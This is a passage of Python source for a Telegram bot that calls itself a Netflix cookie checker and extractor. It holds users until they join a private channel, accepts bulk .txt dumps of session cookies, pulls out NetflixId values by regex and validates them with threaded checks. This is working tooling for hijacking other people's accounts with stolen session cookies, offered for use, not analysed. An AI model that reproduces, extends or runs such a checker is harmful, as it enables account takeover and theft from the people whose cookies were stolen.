            bot.send_message(message.chat.id, "After joining, press the button below to verify:", reply_markup=verify_markup)

    except Exception as e:
        print("Error checking membership:", e)
        # If get_chat_member fails (user not found), assume not a member
        join_markup = types.InlineKeyboardMarkup()
        join_btn = types.InlineKeyboardButton(text="➡ Join Channel", url=PRIVATE_CHANNEL_LINK)
        join_markup.add(join_btn)
        bot.reply_to(message, "❌ You must join our private channel to use this bot.", reply_markup=join_markup)

        verify_markup = types.InlineKeyboardMarkup()
        verify_btn = types.InlineKeyboardButton(text="✅ I've Joined", callback_data="verify_join")
        verify_markup.add(verify_btn)
        bot.send_message(message.chat.id, "After joining, press the button below to verify:", reply_markup=verify_markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    try:
        member = bot.get_chat_member(CHANNEL_ID, call.from_user.id)
        if member.status in ['member', 'creator', 'administrator']:
            send_access_granted(call.message.chat.id)
            bot.answer_callback_query(call.id, "✅ You are now verified!", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "❌ You still haven't joined the channel.", show_alert=True)
    except Exception as e:
        print("Error verifying:", e)
        bot.answer_callback_query(call.id, "❌ Error verifying. Try again later.", show_alert=True)

def send_access_granted(chat_id):
    txt = (
        "✅ Access Granted!\n\n"
        "🔥 Netflix Cookie Checker & Extractor Bot BY @XD_HR\n\n"
        "Commands:\n"
        "/extract <text> — extract cookies from a pasted dump or uploaded .txt (one per line)\n"
        "/chk <cookie_string> — check a single cookie string immediately\n\n"
        "Or upload a .txt file where each line is a cookie string (one per line). Add `workers=NUM` in the file caption to set threads (default 8).\n\n"
        "I will reply with progress and results."
    )
    bot.send_message(chat_id, txt)

# Existing document handler now covers both extract and check workflows:
# ephemeral store for uploaded files
user_file_store = {}

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    doc = message.document
    fname = doc.file_name or "cookies.txt"
    if not fname.lower().endswith('.txt'):
        bot.reply_to(message, "❌ Please upload a .txt file (one cookie per line).")
        return

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        local_path = os.path.join(DOWNLOAD_DIR, f"{message.from_user.id}_{int(time.time())}_{fname}")
        with open(local_path, 'wb') as f:
            f.write(downloaded)
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to download file: {e}")
        return

    # store path for later use with /chk or /extract
    user_file_store[message.from_user.id] = local_path

    bot.reply_to(message, "✅ File received! Now reply to it with /chk or /extract to process.")

# /extract command: supports inline text or file content if user attaches after command

@bot.message_handler(commands=['chk', 'check'])
def cmd_chk(message):
    # get file path if user replied to a file
    file_path = None
    if message.reply_to_message:
        file_path = user_file_store.get(message.from_user.id)

    if not file_path:
        bot.reply_to(
            message,
            "⚠️ Please send a .txt file (each line a cookie string) "
            "and reply to it with /chk or /extract.\n"
            "Checking cookies directly from text is disabled."
        )
        return

    # start checking the file
    workers = DEFAULT_WORKERS
    sent = bot.reply_to(message, f"📥 Starting check on your file...\nWorkers: {workers}")
    job = FileJob(
        chat_id=message.chat.id,
        message_id=sent.message_id,
        filename=file_path,
        workers=workers,
        user=message.from_user
    )
    t = threading.Thread(target=process_file_job, args=(job,))
    t.start()

@bot.message_handler(commands=['extract'])
def cmd_extract(message):
    """
    Usage:
    /extract <paste cookie dump here>
    or
    Reply to an uploaded .txt file with /extract
    """

    args = message.text.partition(' ')[2].strip()

    def get_filtered_netflix_ids(text):
        """
        Extract only NetflixId (ignore SecureNetflixId), handling optional spaces
        around '=' and multiple IDs per line.
        """
        filtered = []
        for line in text.splitlines():
            # Negative lookbehind (?<!Secure) ensures SecureNetflixId is ignored
            # \s* around = handles spaces or no spaces
            matches = re.findall(r'(?<!Secure)NetflixId\s*=\s*([^\|;\n]+)', line)
            for m in matches:
                filtered.append("NetflixId=" + m.strip())
        return filtered

    # 1️⃣ If user provided text directly
    if args:
        filtered_lines = get_filtered_netflix_ids(args)

        if not filtered_lines:
            bot.reply_to(message, "❌ No NetflixId found in the provided text.")
            return

        preview = "\n".join(filtered_lines[:20])
        out_name = os.path.join(RESULTS_DIR, "Extracted_Cookies.txt")
        with open(out_name, 'w', encoding='utf-8') as fo:
            for line in filtered_lines:
                fo.write(line + "\n")

        bot.reply_to(
            message,
            f"✅ Extracted {len(filtered_lines)} NetflixId(s). Preview (first {min(20,len(filtered_lines))}):\n\n{preview}"
        )
        with open(out_name, 'rb') as fsend:
            bot.send_document(message.chat.id, fsend)
        return

    # 2️⃣ If user replied to a previously uploaded file
    elif message.reply_to_message:
        file_path = user_file_store.get(message.from_user.id)
        if not file_path:
            bot.reply_to(message, "❌ Couldn't find the file you replied to.")
            return
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                raw = f.read()
        except Exception as e:
            bot.reply_to(message, f"❌ Failed to read file: {e}")
            return

        filtered_lines = get_filtered_netflix_ids(raw)

        if not filtered_lines:
            bot.reply_to(message, "❌ No NetflixId found in that file.")
            return

        out_name = os.path.join(RESULTS_DIR, "Extracted_Cookies.txt")
        with open(out_name, 'w', encoding='utf-8') as fo:
            for line in filtered_lines:
                fo.write(line + "\n")

        bot.reply_to(message, f"✅ Extracted {len(filtered_lines)} NetflixId(s). Sending file...")
        with open(out_name, 'rb') as fsend:
            bot.send_document(message.chat.id, fsend)
        return

    # 3️⃣ Otherwise, show usage instructions
    else:
        bot.reply_to(
            message,
            "Usage:\n1) Send `/extract <paste cookie dump here>`\nOR\n2) Reply to an uploaded .txt file with /extract."
        )

@bot.callback_query_handler(func=lambda call: call.data in ["act_chk", "act_extract"])
def callback_action(call):
    user_id = call.from_user.id
    data = call.data
    raw = user_temp_store.get(user_id)
    if not raw:
        bot.answer_callback_query(call.id, "No stored input found. Please paste the cookie string again.", show_alert=True)
        return

    if data == "act_chk":
        checker = NetflixChecker()
        cookies = checker.load_cookies(raw)
        if not cookies:
            bot.answer_callback_query(call.id, "Couldn't parse cookies from the text.", show_alert=True)
            return
        msg = bot.send_message(call.message.chat.id, "🔎 Checking cookie — please wait...")
        try:
            res = checker.check_account(cookies)
            formatted = checker.format_result_line(res)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=msg.message_id, text=f"📋 Result:\n\n{formatted}")
            bot.answer_callback_query(call.id, "Checked.")
        except Exception as e:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=msg.message_id, text=f"❌ Error while checking: {e}")
            bot.answer_callback_query(call.id, "Error during check.")
    else:
        extracted = extract_cookie_strings_from_text(raw)
        if not extracted:
            bot.answer_callback_query(call.id, "Couldn't extract cookies.", show_alert=True)
            return
        preview = "\n".join(extracted[:20])
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        out_name = os.path.join(RESULTS_DIR, f"Extracted_Cookies.txt")
        with open(out_name, 'w', encoding='utf-8') as fo:
            for line in extracted:
                fo.write(line + "\n")
        bot.send_message(call.message.chat.id, f"✅ Extracted {len(extracted)} cookie strings. Sending file...")
        with open(out_name, 'rb') as fsend:
            bot.send_document(call.message.chat.id, fsend)
        bot.answer_callback_query(call.id, "Extracted and sent file.")

# ---------- Run bot ----------
if __name__ == "__main__":
    print("Bot started...")
    bot.polling(none_stop=True)